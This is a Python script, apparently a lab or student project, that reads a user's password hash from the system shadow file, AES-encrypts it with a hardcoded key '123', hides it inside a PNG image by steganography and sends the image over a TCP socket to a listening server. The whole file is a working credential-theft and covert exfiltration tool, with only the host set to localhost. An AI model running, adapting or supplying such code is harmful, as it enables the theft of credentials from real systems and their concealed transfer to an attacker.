import cv2
import socket
from os import getuid
from spwd import getspnam
from AES_Cipher import AESCipher
from steganography_with_aes_encryption import encode, decode    

def image_sender():

    HOST = 'localhost'
    PORT = 1002

    #region Code needed for shadow file to image ziping

    # username = getpass.getuser()  # returns root if for the username if superuser premission is granted
    username = socket.gethostname() # returns the computername/hostname

    shadow_file_password = getspnam(username)[1]

    input_image = 'goku.png'
    output_image = 'goku_shadow_file.png'
    secret_data = shadow_file_password

    aes_kljuc = '123'
    AESCipher_object = AESCipher(str(aes_kljuc))
    aes_key = AESCipher_object.key

    encrypted = AESCipher_object.encrypt(secret_data)

    # encode the data into the image
    encoded_image = encode(image_name=input_image, secret_data=str(encrypted))
    # save the output image (encoded image)
    cv2.imwrite(output_image, encoded_image)

    # decoded_data = decode(output_image, AESCipher_object)
    # print("[+] Decoded data:", decoded_data)

    print("Sending image to server file to server")
    print("-"*60)

    #endregion


    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #AF_INET = IP, SOCK_STREAM = TCP
    client.connect((HOST, PORT)) #127.0.0.1

    file = open(output_image, 'rb')

    image_data = file.read(2048)

    while image_data:
        client.send(image_data)
        image_data = file.read(2048)
        

    file.close()
    client.close()




